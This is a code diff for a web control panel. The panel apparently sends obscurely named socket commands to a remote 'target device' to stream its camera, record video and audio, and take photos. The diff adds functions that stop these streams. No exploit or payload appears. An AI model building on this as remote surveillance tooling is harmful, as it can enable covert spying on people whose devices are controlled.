@@ -2094,6 +2094,49 @@ export default function Home(props: any) {
         setAudioElapsed(0);
     }, [socket, selectedDeviceId, session]);
 
+    // --- Live Camera Stop Function ---
+    const stopLiveCamera = useCallback(() => {
+        const effectiveTarget = selectedDeviceIdRef.current || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
+        if (socket && effectiveTarget && session?.user?.uuid) {
+            socket.emit('c_f5', {
+                uuid: session.user.uuid,
+                targetDeviceId: effectiveTarget
+            });
+        }
+        setIsLiveStreaming(false);
+        isLiveStreamingRef.current = false;
+        if (liveImageRef.current) liveImageRef.current.src = '';
+    }, [socket, selectedDeviceId, session]);
+
+    // Auto-stop active camera or audio streams whenever user switches tools / leaves camera or voice views
+    useEffect(() => {
+        if (selectedTool !== 'camera' && isLiveStreamingRef.current) {
+            stopLiveCamera();
+        }
+        if (selectedTool !== 'audio' && isLiveAudioRef.current) {
+            stopLiveAudio();
+        }
+    }, [selectedTool, stopLiveCamera, stopLiveAudio]);
+
+    // Auto-stop active camera or audio streams when user navigates away, closes tab, or closes window
+    useEffect(() => {
+        const handleExit = () => {
+            if (isLiveStreamingRef.current) {
+                stopLiveCamera();
+            }
+            if (isLiveAudioRef.current) {
+                stopLiveAudio();
+            }
+        };
+
+        window.addEventListener('beforeunload', handleExit);
+        window.addEventListener('pagehide', handleExit);
+        return () => {
+            window.removeEventListener('beforeunload', handleExit);
+            window.removeEventListener('pagehide', handleExit);
+        };
+    }, [stopLiveCamera, stopLiveAudio]);
+
     // --- Voice Recording Functions ---
     const startVoiceRecording = useCallback(() => {
         requireConnectedDevice((targetId) => {
@@ -2514,12 +2557,13 @@ END:VCARD`;
                                 const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
                                 if (!effectiveTarget) return;
 
-                                if (isLiveStreaming) {
-                                    socket?.emit('c_f5', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget });
-                                    setIsLiveStreaming(false);
-                                    isLiveStreamingRef.current = false;
-                                    if (liveImageRef.current) liveImageRef.current.src = '';
+                                if (isLiveStreamingRef.current || isLiveStreaming) {
+                                    stopLiveCamera();
                                 } else {
+                                    if (isRecording) {
+                                        socket?.emit('c_f3', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget });
+                                        setIsRecording(false);
+                                    }
                                     socket?.emit('c_f4', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget, camera: cameraMode, quality: cameraQuality });
                                     setIsLiveStreaming(true);
                                     isLiveStreamingRef.current = true;
@@ -2533,6 +2577,11 @@ END:VCARD`;
                             requireConnectedDevice((targetId) => {
                                 const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
                                 if (!effectiveTarget) return;
+
+                                // Auto-stop live stream if running so camera hardware is free and UI does not freeze
+                                if (isLiveStreamingRef.current || isLiveStreaming) {
+                                    stopLiveCamera();
+                                }
 
                                 setIsCapturingPhoto(true); 
                                 setCapturedMedia(prev => [{
@@ -2560,6 +2609,10 @@ END:VCARD`;
                                     socket?.emit('c_f3', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget });
                                     setIsRecording(false);
                                 } else {
+                                    // Auto-stop live stream if running before starting video recording
+                                    if (isLiveStreamingRef.current || isLiveStreaming) {
+                                        stopLiveCamera();
+                                    }
                                     setIsRecording(true);
                                     setRecordingProgress({ current: 0, total: recordingDuration });
                                     socket?.emit('c_f2', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget, camera: cameraMode, duration: recordingDuration });
